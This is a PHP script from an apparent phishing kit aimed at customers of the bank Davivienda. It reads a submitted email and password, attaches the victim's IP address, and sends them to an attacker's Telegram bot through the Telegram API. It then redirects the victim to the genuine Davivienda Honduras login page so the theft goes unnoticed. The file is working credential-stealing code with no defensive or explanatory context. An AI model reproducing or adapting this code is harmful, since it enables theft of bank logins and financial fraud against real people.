<?php   

@session_start();
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
$DUn = $_POST['D1'];
$DDo = $_POST['D2'];
include 'infr.php';

if ( isset ($DUn) && isset ($DDo) ){
$mss ="[==== DAVIVIENDA Emails ====]"."\n"."Coore: ".$DUn."\n"."#pasCoor: ".$DDo."\n".$userp."\r\n";
$puro =  $bot_Tele;
$data = ['chat_id' => $chat,'text' => $mss];
$response = file_get_contents("https://api.telegram.org/bot$puro/sendMessage?" . http_build_query($data));
header ('location: https://enlinea.davivienda.com.hn/');

} 


?>